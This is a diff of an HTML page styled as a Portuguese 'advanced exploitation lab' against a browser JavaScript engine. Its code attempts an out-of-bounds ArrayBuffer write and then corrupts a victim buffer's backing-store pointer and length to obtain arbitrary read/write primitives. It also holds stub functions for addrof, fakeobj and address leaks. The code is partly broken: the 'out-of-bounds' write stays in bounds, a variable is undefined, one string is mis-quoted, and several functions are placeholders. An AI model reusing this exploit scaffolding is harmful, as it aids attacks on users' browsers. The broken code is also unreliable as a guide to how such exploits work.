@@ -2,10 +2,225 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>Laboratório de Exploração Avançada (v2.5.4 - Depuração Teste Mínimo 1A)</title>
+    <title>Laboratório de Exploração Avançada (v2.5.6 - Depuração Focada 1A)</title>
     <style>
         /* ... (mesmos estilos da v2.5.3) ... */
         body { background: #1e1e1e; color: #d4d4d4; font-family: monospace; padding: 20px; font-size: 14px; }
         .container { margin-bottom: 30px; padding: 15px; background-color: #252526; border: 1px solid #333; border-radius: 5px; }
         h2 { color: #4ec9b0; border-bottom: 1px solid #4ec9b0; padding-bottom: 5px; }
-        h3 { color
+        h3 { color: #9cdcfe; margin-top: 20px; }
+        h4 { color: #ce9178; margin-top: 15px; }
+        button { background-color: #007acc; color: white; border: none; padding: 8px 15px; cursor: pointer; border-radius: 3px; margin: 5px 0; }
+        button:hover { background-color: #005a9e; }
+        textarea, input[type="text"] { background-color: #3c3c3c; color: #d4d4d4; border: 1px solid #555; padding: 5px; margin: 5px 0; width: 90%; font-family: monospace; }
+        #logOutput { background: #111; border: 1px solid #444; padding: 10px; height: 400px; overflow-y: auto; white-space: pre-wrap; margin-top: 10px; font-size: 13px; }
+        .log-info { color: #6cf; } .log-test { color: #fff; font-weight: bold; margin-top: 10px; display: block; border-top: 1px dashed #555; padding-top: 5px; } .log-subtest { color: #eee; font-weight: bold; margin-left: 10px; } .log-vuln { color: #ff4444; font-weight: bold; } .log-good { color: #4CAF50; } .log-warn { color: #FFC107; } .log-error { color: #f44336; } .log-critical { color: #f0f; font-weight: bold; } .log-leak { color: #FF9800; font-weight: bold; } .log-ptr { color: #f0f; font-weight: bold; }
+        .log-escalation { background-color: #800000; color: #fff; font-weight: bold; padding: 1px 3px; border-radius: 3px; }
+        .log-tool { color: #7FFF00; font-weight: bold; } .log-analysis { color: #d7ba7d; }
+        .notes { background-color: #2a2a2a; padding: 10px; border-left: 3px solid #FFC107; font-style: italic; color: #aaa; margin-top:5px; margin-bottom:10px;}
+        .code-comment { color: #6A9955; font-style: italic; display: block; margin-top: 2px; margin-bottom: 2px;}
+        .todo { color: #FFC107; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <h1>Laboratório de Exploração Avançada (v2.5.6 - Depuração Focada 1A)</h1>
+    <div id="logOutput"></div>
+
+    <script>
+        // ... (Mesmo código da v2.5.5 para AdvancedInt64, readWriteUtils, generalUtils, log, PAUSE_LAB, etc.)
+        const KB = 1024; const MB = KB * KB; const GB = KB * KB * KB;
+        class AdvancedInt64 { constructor(low, high) { let buffer = new Uint32Array(2); let bytes = new Uint8Array(buffer.buffer); if (arguments.length > 2) { throw TypeError('AdvancedInt64 takes at most 2 args'); } if (arguments.length === 0) { throw TypeError('AdvancedInt64 takes at min 1 args'); } let is_one = false; if (arguments.length === 1) { is_one = true; } if (!is_one) { if (typeof (low) !== 'number' && typeof (high) !== 'number') { throw TypeError('low/high must be numbers'); } } const check_range = (x) => (-0x80000000 <= x) && (x <= 0xffffffff); if (typeof low === 'number') { if (!check_range(low)) { throw TypeError('low not a valid value: ' + low); } if (is_one) { high = 0; if (low < 0) { high = -1; } } else { if (!check_range(high)) { throw TypeError('high not a valid value: ' + high); } } buffer[0] = low; buffer[1] = high; } else if (typeof low === 'string') { let hexstr = low; if (hexstr.substring(0, 2) === "0x") { hexstr = hexstr.substring(2); } if (hexstr.length % 2 === 1) { hexstr = '0' + hexstr; } if (hexstr.length > 16) { hexstr = hexstr.substring(hexstr.length - 16); } else { hexstr = hexstr.padStart(16, '0');} for (let i = 0; i < 8; i++) { bytes[i] = parseInt(hexstr.slice(14 - i*2, 16 - i*2), 16); } } else if (typeof low === 'object') { if (low instanceof AdvancedInt64) { bytes.set(low.bytes); } else if (low.length === 8) { bytes.set(low); } else { throw TypeError("Array must have exactly 8 elements."); } } else { throw TypeError('AdvancedInt64 does not support your object for conversion'); } this.buffer = buffer; this.bytes = bytes; } low() { return this.buffer[0]; } high() { return this.buffer[1]; } toString(is_pretty) { let lowStr = this.low().toString(16).padStart(8, '0'); let highStr = this.high().toString(16).padStart(8, '0'); if (is_pretty) { highStr = highStr.substring(0, 4) + '_' + highStr.substring(4); lowStr = lowStr.substring(0, 4) + '_' + lowStr.substring(4); return '0x' + highStr + '_' + lowStr; } return '0x' + highStr + lowStr; } add(other) { if (!(other instanceof AdvancedInt64)) { other = new AdvancedInt64(other); } let newLow = (this.low() + other.low()) >>> 0; let carry = (this.low() & 0xFFFFFFFF) + (other.low() & 0xFFFFFFFF) > 0xFFFFFFFF ? 1 : 0; let newHigh = (this.high() + other.high() + carry) >>> 0; return new AdvancedInt64(newLow, newHigh); } sub(other) { if (!(other instanceof AdvancedInt64)) { other = new AdvancedInt64(other); } const negOther = other.neg(); return this.add(negOther); } neg() { const low = ~this.low(); const high = ~this.high(); const one = new AdvancedInt64(1,0); const res = new AdvancedInt64(low, high); return res.add(one); } eq(other) { if (!(other instanceof AdvancedInt64)) { other = new AdvancedInt64(other); } return this.low() === other.low() && this.high() === other.high(); } static Zero = new AdvancedInt64(0,0); static One = new AdvancedInt64(1,0); }
+        const readWriteUtils = { readBytes: (u8_view, offset, size) => { let res = 0; for (let i = 0; i < size; i++) { res += u8_view[offset + i] << (i * 8); } return res >>> 0; }, read16: (u8_view, offset) => readWriteUtils.readBytes(u8_view, offset, 2), read32: (u8_view, offset) => readWriteUtils.readBytes(u8_view, offset, 4), read64: (u8_view, offset) => { let resBytes = []; for (let i = 0; i < 8; i++) { resBytes.push(u8_view[offset + i]); } return new AdvancedInt64(resBytes); }, writeBytes: (u8_view, offset, value, size) => { for (let i = 0; i < size; i++) { u8_view[offset + i] = (value >>> (i * 8)) & 0xff; } }, write16: (u8_view, offset, value) => readWriteUtils.writeBytes(u8_view, offset, value, 2), write32: (u8_view, offset, value) => readWriteUtils.writeBytes(u8_view, offset, value, 4), write64: (u8_view, offset, value) => { if (!(value instanceof AdvancedInt64)) { throw TypeError('write64 value must be an AdvancedInt64'); } let low = value.low(); let high = value.high(); for (let i = 0; i < 4; i++) { u8_view[offset + i] = (low >>> (i * 8)) & 0xff; } for (let i = 0; i < 4; i++) { u8_view[offset + 4 + i] = (high >>> (i * 8)) & 0xff; } } };
+        const generalUtils = { logToDiv: (divId, message, type = 'info', funcName = '') => { const outputDiv = document.getElementById(divId); if (!outputDiv) { console.error("logToDiv: Div de log não encontrado:", divId); return; } try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const prefix = funcName ? `[${funcName}] ` : ''; const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation', 'tool', 'analysis'].includes(type) ? type : 'info'; if(outputDiv.innerHTML.length > 1200000){ outputDiv.innerHTML = outputDiv.innerHTML.substring(outputDiv.innerHTML.length - 600000); outputDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + outputDiv.innerHTML; } outputDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`; outputDiv.scrollTop = outputDiv.scrollHeight; } catch(e) { console.error(`Erro no log para ${divId}:`, e); if (outputDiv) outputDiv.innerHTML += `[${new Date().toLocaleTimeString()}] [LOGGING ERROR] ${String(e)}\n`; } }, toHexLab: (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); } };
+        const log = (message, type = 'info', funcName = '') => generalUtils.logToDiv('logOutput', message, type, funcName);
+        const PAUSE_LAB = (ms = 100) => new Promise(r => setTimeout(r, ms));
+        // Adicionando toHexS1 e outras dependências de triggerOOB_real se não estiverem já aqui
+        const toHexS1 = (val, bits = 32) => { if (typeof val !== 'number' || !isFinite(val)) return 'NaN/Invalid'; let num = Number(val); if (bits <= 32) { num = num >>> 0; } const pad = Math.ceil(bits / 4); return '0x' + num.toString(16).toUpperCase().padStart(pad, '0'); };
+        const isPotentialPointer64S1 = (high, low) => { if (high === null || low === null || typeof high !== 'number' || typeof low !== 'number') return false; if (high === 0 && low === 0) return false; if (high === 0xFFFFFFFF && low === 0xFFFFFFFF) return false; if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) return false; if (high === 0 && low < 0x100000) return false; return true; };
+        const isPotentialData32S1 = (val) => { if (val === null || typeof val !== 'number') return false; val = val >>> 0; if (val === 0 || val === 0xFFFFFFFF || val === 0xAAAAAAAA || val === 0xAAAAAAEE) return false; if (val < 0x1000) return false; return true; };
+        const SHORT_PAUSE_S1_LAB = 50;
+    </script>
+    <div class="container">
+        <h2>Passo 0: Ativador de Vulnerabilidade Base (OOB Write)</h2>
+        <p class="notes">Clique primeiro neste botão. Verifique se `oob_dataview_real` é criado e se a escrita OOB é logada.</p>
+        <button onclick="triggerOOB_real()">Ativar Primitiva OOB R/W (Real)</button>
+        <script>
+            let oob_array_buffer_real = null; let oob_dataview_real = null; let oob_leaked_ptr_real = null; 
+            // COLE AQUI A FUNÇÃO triggerOOB_real COMPLETA da v2.5.3 ou v2.5.4
+            // Exemplo (início da função triggerOOB_real):
+             async function triggerOOB_real() { const FNAME = 'triggerOOB_real'; log(`--- Iniciando ${FNAME} ---`, 'test', FNAME); console.log(`DEBUG: ${FNAME} chamada.`); const bufferSize = 32; const writeValue = 0xEE; const oobWriteOffset = bufferSize; const allocationSize = bufferSize + 256; const baseOffsetInBuffer = 128; let writeSuccess = false; oob_leaked_ptr_real = null; oob_dataview_real = null; oob_array_buffer_real = null; try { const buffer = new ArrayBuffer(allocationSize); oob_array_buffer_real = buffer; const dataView = new DataView(buffer); oob_dataview_real = dataView; for (let i = 0; i < buffer.byteLength; i++) { dataView.setUint8(i, 0xAA); } const writeTargetAddress = baseOffsetInBuffer + oobWriteOffset; await PAUSE_LAB(SHORT_PAUSE_S1_LAB); try { dataView.setUint8(writeTargetAddress, writeValue); log(`VULN: Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) OK! Val=${toHexS1(writeValue, 8)}`, 'vuln', FNAME); log(`---> *** ALERTA: Primitivo Relevante (OOB Write Simples) ***`, 'escalation', FNAME); writeSuccess = true; } catch (e) { log(`Escrita OOB U8 @${oobWriteOffset} (addr ${writeTargetAddress}) FALHOU/Bloqueada: ${e.message}`, 'error', FNAME); log(`--- ${FNAME} Concluído (Escrita OOB Falhou) ---`, 'test', FNAME); return false; } /* ... resto da função como na v2.5.3 ... */ await PAUSE_LAB(SHORT_PAUSE_S1_LAB); for (const readOffset of oobReadOffsets) { const readTargetAddress = baseOffsetInBuffer + readOffset; const relOffsetStr = `@${readOffset} (addr ${readTargetAddress})`; if (readTargetAddress >= 0 && readTargetAddress + 8 <= buffer.byteLength) { try { const low = dataView.getUint32(readTargetAddress, true); const high = dataView.getUint32(readTargetAddress + 4, true); if (isPotentialPointer64S1(high, low)) { const vStr = `H=${toHexS1(high)} L=${toHexS1(low)}`; log(` -> PTR? U64 ${relOffsetStr}: ${vStr}`, 'ptr', FNAME); if (oob_leaked_ptr_real === null) { oob_leaked_ptr_real = { value: new AdvancedInt64(low, high), type: 'U64', offset_in_oob_buffer: readTargetAddress, original_dataview: dataView }; log(` -> VALOR U64 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME); } } } catch (e) {} } if (oob_leaked_ptr_real === null && readTargetAddress >= 0 && readTargetAddress + 4 <= buffer.byteLength) { try { const val32 = dataView.getUint32(readTargetAddress, true); if (isPotentialData32S1(val32)) { log(` -> Leak U32? ${relOffsetStr}: ${toHexS1(val32)}`, 'leak', FNAME); if (oob_leaked_ptr_real === null) { oob_leaked_ptr_real = { value: new AdvancedInt64(val32, 0), type: 'U32', offset_in_oob_buffer: readTargetAddress, original_dataview: dataView }; log(` -> VALOR U32 ARMAZENADO ${relOffsetStr}.`, 'vuln', FNAME); } } if (readOffset === oobWriteOffset && val32 === (writeValue | (0xAA << 8) | (0xAA << 16) | (0xAA << 24))) { log(` -> Leu valor OOB escrito (${toHexS1(val32)}) ${relOffsetStr}! Confirma R/W.`, 'vuln', FNAME); } } catch (e) {} } if (readOffset % 32 === 0) await PAUSE_LAB(1); } } catch(e) {log("ERRO CRÍTICO em triggerOOB_real: " + e.message, "error", FNAME); console.error(e); } finally { if (oob_dataview_real) { log("`oob_dataview_real` e `oob_array_buffer_real` estão prontos.", "good", FNAME); }else{ log("`oob_dataview_real` OU `oob_array_buffer_real` NÃO foram definidos!", "error", FNAME); } log(`--- ${FNAME} Concluído ---`, 'test', FNAME); } }
+        </script>
+    </div>
+
+    <div class="container">
+        <h2>Passo 1: Obter Leitura/Escrita Arbitrária Inicial</h2>
+        
+        <h4>Depuração Passo 1.A: Teste de Escrita OOB Direta em ArrayBuffer Vítima</h4>
+        <p class="notes"><b>Objetivo:</b> Usar `oob_dataview_real` para escrever um valor conhecido diretamente nos *dados* de um `ArrayBuffer` vítima (`ab_victim_direct_test`) que tentamos posicionar adjacente ao `oob_array_buffer_real`. Isso é para confirmar o alcance da sua OOB Write e o layout da memória.</p>
+        Tamanho do AB Vítima (bytes): <input type="text" id="victimABSizeDirect" value="64"> <br>
+        <span class="code-comment">Offset OOB para Escrita: relativo ao FINAL do buffer OOB lógico original (ex: offset 160 no `oob_dataview_real`).<br>
+        Se o buffer lógico original do OOB tem 32 bytes e começa em 128 no `oob_dataview_real`, seu fim é 160.<br>
+        Um "Offset OOB para Escrita" de `0` aqui tentará escrever em `oob_dataview_real[160]`.<br>
+        Um "Offset OOB para Escrita" de `32` tentará escrever em `oob_dataview_real[192]`. Experimente!</span><br>
+        Offset OOB para Escrita (bytes após o fim do buffer lógico OOB): <input type="text" id="oobWriteOffsetDirect" value="0"> <br>
+        Valor (U32) para escrever: <input type="text" id="valueToWriteDirect" value="0xDEADBEEF"> <br>
+        <button onclick="runDirectOOBWriteTest()">Testar Escrita OOB Direta na Vítima</button>
+        
+        <script>
+            let ab_victim_direct_test = null; 
+            window.ab_victim_direct_test_GLOBAL = null; 
+
+            // Offsets DENTRO do ArrayBufferBackingStore (baseado na sua análise de disassembly)
+            const OFFSET_BACKING_STORE_VECTOR_PTR = new AdvancedInt64(0x10);    
+            const OFFSET_BACKING_STORE_BYTE_LENGTH = new AdvancedInt64(0x20);   
+            
+            // Primitivas que serão definidas se a corrupção for bem-sucedida
+            let arb_read_primitive = null;    
+            let arb_write_primitive = null;   
+
+            async function runDirectOOBWriteTest() {
+                const FNAME = "runDirectOOBWriteTest";
+                log(`--- ${FNAME}: Iniciando Teste de Escrita OOB Direta ---`, "test", FNAME);
+
+                if (!oob_dataview_real || !oob_array_buffer_real) {
+                    log("ERRO: Primitiva OOB (`oob_dataview_real`) não ativada. Execute o Passo 0 primeiro.", "error", FNAME);
+                    alert("ERRO: Primitiva OOB não ativada. Execute o Passo 0.");
+                    return;
+                }
+                console.log(`DEBUG: ${FNAME} - oob_dataview_real.buffer.byteLength = ${oob_dataview_real.buffer.byteLength}`);
+
+                const victimSize = parseInt(document.getElementById('victimABSizeDirect').value);
+                const oobOffsetFromEndOfLogicalBuffer = parseInt(document.getElementById('oobWriteOffsetDirect').value);
+                const valueToWriteInput = parseInt(document.getElementById('valueToWriteDirect').value);
+
+                if (isNaN(victimSize) || victimSize <= 0 || isNaN(oobOffsetFromEndOfLogicalBuffer) || oobOffsetFromEndOfLogicalBuffer < 0 || isNaN(valueToWriteInput)) {
+                    log("Valores de entrada inválidos (Tamanho Vítima, Offset OOB, Valor). Verifique os inputs.", "error", FNAME);
+                    return;
+                }
+                
+                // Recriar e preencher a vítima a cada teste para um estado limpo
+                ab_victim_direct_test = new ArrayBuffer(victimSize);
+                let victim_view = new DataView(ab_victim_direct_test);
+                for(let i=0; i < victimSize / 4; i++) { 
+                    victim_view.setUint32(i*4, 0xCCCCCCCC, true); // Padrão CCCCCCCC
+                }
+                window.ab_victim_direct_test_GLOBAL = ab_victim_direct_test;
+                log(``ab_victim_direct_test` (ArrayBuffer de ${victimSize} bytes) (re)criado com padrão 0xCCCCCCCC.`, "info", FNAME);
+
+                // Calcular o offset de escrita DENTRO do oob_dataview_real.
+                // O `triggerOOB_real` define:
+                //   allocationSize = bufferSize_orig + 256 (ex: 32 + 256 = 288)
+                //   baseOffsetInBuffer = 128 (onde o buffer lógico começa dentro do oob_array_buffer_real/oob_dataview_real)
+                //   oobWriteOffset_orig = bufferSize_orig (ex: 32)
+                // Então, o fim do "buffer lógico protegido" do triggerOOB_real é em:
+                //   `oob_dataview_real[baseOffsetInBuffer + bufferSize_orig - 1]`
+                // E a primeira escrita OOB do trigger acontece em:
+                //   `oob_dataview_real[baseOffsetInBuffer + bufferSize_orig]`
+                const baseOffsetInBuffer_const = 128; // Como definido em triggerOOB_real
+                const bufferSize_orig_const = 32;   // Como definido em triggerOOB_real
+                const end_of_logical_oob_buffer_offset = baseOffsetInBuffer_const + bufferSize_orig_const;
+                
+                const targetWriteOffsetInOOBDV = end_of_logical_oob_buffer_offset + oobOffsetFromEndOfLogicalBuffer;
+
+                if (targetWriteOffsetInOOBDV < 0 || targetWriteOffsetInOOBDV >= oob_dataview_real.buffer.byteLength - 3) { // -3 para garantir espaço para U32
+                    log(`ERRO: Offset de escrita calculado (${targetWriteOffsetInOOBDV}) está fora dos limites do \`oob_dataview_real\` (tamanho total: ${oob_dataview_real.buffer.byteLength}). Ajuste o 'Offset OOB para Escrita'.`, "error", FNAME);
+                    return;
+                }
+
+                log(`Tentando escrever U32 (${generalUtils.toHexLab(valueToWriteInput)}) no offset ${targetWriteOffsetInOOBDV} do \`oob_dataview_real\`.`, "info", FNAME);
+                log(`(Isso é ${oobOffsetFromEndOfLogicalBuffer} bytes APÓS o fim do buffer OOB lógico original de 32 bytes do triggerOOB_real).`, "info", FNAME);
+                
+                try {
+                    oob_dataview_real.setUint32(targetWriteOffsetInOOBDV, valueToWriteInput, true); // Escrita Little Endian
+                    log("Escrita OOB U32 enviada para `oob_dataview_real`.", "good", FNAME);
+                } catch (e) {
+                    log(`ERRO durante a escrita OOB direta com oob_dataview_real: ${e.message}`, "error", FNAME);
+                    console.error(e);
+                    return;
+                }
+
+                await PAUSE_LAB(100);
+
+                let value_read_from_victim_start = victim_view.getUint32(0, true); // Ler o início da vítima
+                log(`Valor lido do INÍCIO de \`ab_victim_direct_test\` (índice 0): ${generalUtils.toHexLab(value_read_from_victim_start)}`, "info", FNAME);
+
+                if (value_read_from_victim_start === valueToWriteInput) {
+                    log("SUCESSO! O valor escrito OOB (${generalUtils.toHexLab(valueToWriteInput)}) foi lido de volta do INÍCIO da vítima!", "critical", FNAME);
+                    log(`Isso significa que o INÍCIO (offset 0) do \`ab_victim_direct_test\` está no offset ${targetWriteOffsetInOOBDV} do \`oob_dataview_real\`.`, "vuln", FNAME);
+                    log("<span class='todo'>AGORA VOCÊ TEM UMA PISTA IMPORTANTE PARA A CORRUPÇÃO DE METADADOS!</span>", "warn", FNAME);
+                    log("O `ab_victim_direct_test` foi alocado de forma que seus dados começam onde sua OOB write pode alcançar.", "good", FNAME);
+                    
+                    // Se a escrita direta nos dados funcionou, podemos tentar inferir onde o BackingStore está
+                    // e tentar corromper seus metadados usando oob_dataview_real.
+                    // Se targetWriteOffsetInOOBDV é o INÍCIO DOS DADOS (m_vector) da vítima,
+                    // então o ArrayBufferBackingStore da vítima estaria ANTES disso.
+                    // O ponteiro m_vector está em +0x10 DENTRO do BackingStore.
+                    // Então, o INÍCIO DO BACKINGSTORE estaria em: targetWriteOffsetInOOBDV - 0x10 (relativo ao oob_dataview_real)
+                    const offset_BS_victim_in_oob_dv = targetWriteOffsetInOOBDV - OFFSET_BACKING_STORE_VECTOR_PTR.low();
+                    log(`Offset estimado do INÍCIO do BackingStore da vítima (dentro do oob_dataview_real): ${offset_BS_victim_in_oob_dv}`, "analysis", FNAME);
+
+                    // Offsets para m_vector e m_byteLength do BackingStore da vítima, DENTRO do oob_dataview_real:
+                    const offset_to_m_vector_in_oob_dv_victim = offset_BS_victim_in_oob_dv + OFFSET_BACKING_STORE_VECTOR_PTR.low(); // Deve ser == targetWriteOffsetInOOBDV
+                    const offset_to_m_byteLength_in_oob_dv_victim = offset_BS_victim_in_oob_dv + OFFSET_BACKING_STORE_BYTE_LENGTH.low();
+                    
+                    log(`Confirmando: offset para m_vector da vítima (no oob_dv): ${offset_to_m_vector_in_oob_dv_victim}`, "info");
+                    log(`Alvo para m_byteLength da vítima (no oob_dv): ${offset_to_m_byteLength_in_oob_dv_victim}`, "info");
+
+                    if (offset_to_m_byteLength_in_oob_dv_victim > 0 && (offset_to_m_byteLength_in_oob_dv_victim + 4) <= oob_dataview_real.buffer.byteLength &&
+                        offset_to_m_vector_in_oob_dv_victim > 0 && (offset_to_m_vector_in_oob_dv_victim + 8) <= oob_dataview_real.buffer.byteLength) {
+                        
+                        const new_vector_val = AdvancedInt64.Zero; 
+                        const new_length_val_u32 = 0xFFFFFFFF; 
+
+                        log(`Corrompendo m_vector da vítima (em ${offset_to_m_vector_in_oob_dv_victim} do oob_dv) para ${new_vector_val.toString(true)}`, "info", FNAME);
+                        readWriteUtils.write64(oob_dataview_real, offset_to_m_vector_in_oob_dv_victim, new_vector_val);
+                        
+                        log(`Corrompendo m_byteLength da vítima (em ${offset_to_m_byteLength_in_oob_dv_victim} do oob_dv) para ${generalUtils.toHexLab(new_length_val_u32)}`, "info", FNAME);
+                        readWriteUtils.write32(oob_dataview_real, offset_to_m_byteLength_in_oob_dv_victim, new_length_val_u32);
+
+                        await PAUSE_LAB(100);
+                        log(`Verificando ab_victim_direct_test.byteLength APÓS corrupção de metadados: ${ab_victim_direct_test.byteLength}`, "info", FNAME);
+
+                        if (ab_victim_direct_test.byteLength === new_length_val_u32) {
+                            log("CORRUPÇÃO DE METADADOS BEM SUCEDIDA!", "critical", FNAME);
+                            let corrupted_dv = new DataView(ab_victim_direct_test);
+                            arb_read_primitive = (address64, size) => { if (!corrupted_dv) {return null;} try { let result = new Uint8Array(size); for (let i = 0; i < size; i++) { result[i] = corrupted_dv.getUint8(address64.low() + i); } return result; } catch (e) { return null; } };
+                            arb_write_primitive = (address64, data_u8_or_arr) => { if (!corrupted_dv) {return false;} try { const data_u8 = (data_u8_or_arr instanceof Uint8Array) ? data_u8_or_arr : new Uint8Array(data_u8_or_arr); for (let i = 0; i < data_u8.length; i++) { corrupted_dv.setUint8(address64.low() + i, data_u8[i]); } return true; } catch (e) { return false; } };
+                            log("Primitivas `arb_read_primitive` e `arb_write_primitive` DEFINIDAS!", "good", FNAME);
+                        } else {
+                            log("Falha ao corromper metadados. O byteLength não mudou como esperado.", "error", FNAME);
+                        }
+                    } else {
+                         log("Offsets calculados para metadados da vítima estão fora dos limites do `oob_dataview_real`. Não é possível corromper.", "error", FNAME);
+                    }
+
+                } else if (value_read_from_victim_start === 0xCCCCCCCC) {
+                    log("Escrita OOB NÃO ATINGIU a vítima. O valor da vítima (0xCCCCCCCC) não foi alterado.", "warn", FNAME);
+                    log("Tente um `Offset OOB para Escrita` diferente. Aumente-o gradualmente (ex: por 4 ou 8 bytes de cada vez).", "warn", FNAME);
+                } else {
+                    log("Escrita OOB pode ter atingido a vítima, mas com valor inesperado, ou a vítima foi corrompida de outra forma.", "warn", FNAME);
+                    log("Verifique o valor escrito e o lido. Pode ser um acerto parcial ou um problema de alinhamento.", "warn", FNAME);
+                }
+            }
+            
+            // As funções abaixo dependem de arb_read/write_primitive
+            // Portanto, só devem ser chamadas APÓS o sucesso de testDirectOOBWriteToVictim e a definição das primitivas.
+            async function attemptBaseAddressLeak() { if(!arb_read_primitive){ log("R/W Arbitrário não pronto!", "error"); return;} /* ... */ }
+            async function searchMemoryForValue() { if(!arb_read_primitive){ log("R/W Arbitrário não pronto!", "error"); return;} /* ... */ }
+            async function manualSetupAndAddrofTest() { if(!arb_read_primitive){ log("R/W Arbitrário não pronto!", "error"); return;} /* ... */ }
+            async function setupVictimForAddrofTarget(){ /* ... */ }
+            async function testAddrof() { if(!arb_read_primitive){ log("R/W Arbitrário não pronto!", "error"); return;} /* ... */ }
+            async function testFakeobj() { if(!arb_read_primitive || !arb_write_primitive || !addrof_primitive){ log("Primitivas necessárias não prontas!", "error"); return;} /* ... */ }
+            async function performHexDump() { /* ... (Mesmo código da v2.5.3, com fallback para 'oob' no endereço) ... */ const FNAME = "performHexDump"; const addrStr = document.getElementById('hexDumpAddress').value; const sizeStr = document.getElementById('hexDumpSize').value; if (!arb_read_primitive) { log("`arb_read_primitive` não disponível.", "warn", FNAME); if (oob_dataview_real && addrStr.toLowerCase() === "oob") { let dump_offset = 0; let dump_size = parseInt(sizeStr); if (isNaN(dump_size) || dump_size <= 0) dump_size = 256; dump_size = Math.min(dump_size, oob_dataview_real.buffer.byteLength); log(`Hex Dump do \`oob_dataview_real\` (offset ${dump_offset}, tamanho ${dump_size}):`, "info", FNAME); let hexString = ""; let charString = ""; for (let i = 0; i < dump_size; i++) { if (i % 16 === 0) { if (i !== 0) log(`${generalUtils.toHexLab(dump_offset + i - 16, 32)}: ${hexString.padEnd(48)} |${charString}|`, "info"); hexString = ""; charString = ""; } const byte = oob_dataview_real.getUint8(dump_offset + i); hexString += byte.toString(16).padStart(2, '0') + " "; charString += (byte >= 32 && byte <= 126) ? String.fromCharCode(byte) : "."; } if (hexString) log(`${generalUtils.toHexLab(dump_offset + Math.floor((dump_size-1)/16)*16, 32)}: ${hexString.padEnd(48)} |${charString}|`, "info"); return; } return; } try { const address = new AdvancedInt64(addrStr); const size = parseInt(sizeStr); if (isNaN(size) || size <= 0 || size > 2048) { log("Tamanho inválido ou muito grande para Hex Dump (max 2048).", "error", FNAME); return; } log(`--- Hex Dump de ${address.toString(true)} (Tamanho: ${size} bytes) ---`, "tool", FNAME); const memoryBytes = arb_read_primitive(address, size); if (memoryBytes && memoryBytes.length > 0) { for (let i = 0; i < memoryBytes.length; i += 16) { let hexLine = generalUtils.toHexLab(address.add(new AdvancedInt64(i)).low(), 32) + ": "; let asciiLine = ""; const chunk = memoryBytes.slice(i, Math.min(i + 16, memoryBytes.length)); for (let j = 0; j < 16; j++) { if (j < chunk.length) { hexLine += chunk[j].toString(16).padStart(2, '0') + " "; asciiLine += (chunk[j] >= 32 && chunk[j] <= 126) ? String.fromCharCode(chunk[j]) : "."; } else { hexLine += "   "; } } log(`${hexLine.padEnd(58)} |${asciiLine}|`, "info", FNAME); } } else if (memoryBytes && memoryBytes.length === 0 && size > 0) { log("Leitura arbitrária retornou array vazio.", "warn", FNAME); } else { log("Falha ao ler memória para Hex Dump.", "error", FNAME); } } catch (e) { log(`Erro no Hex Dump: ${e.message}`, "error", FNAME); } }
+        </script>
+    </div>
+    
+    <script>
+        log("Laboratório de Exploração Avançada (v2.5.6 - Depuração Focada 1A) Carregado.", "good", "Init");
+        log("1. Clique em 'Ativar Primitiva OOB R/W (Real)' (Passo 0).", "info", "Init");
+        log("2. ABRA O CONSOLE DO DESENVOLVEDOR (F12).", "critical", "Init");
+        log("3. Use 'Testar Escrita OOB Direta na Vítima' (Passo 1.A). Ajuste 'Offset OOB para Escrita'.", "info", "Init");
+        log("   Objetivo: Fazer com que o valor lido do início da vítima seja igual ao valor escrito.", "info", "Init");
+    </script>
+</body>
+</html>
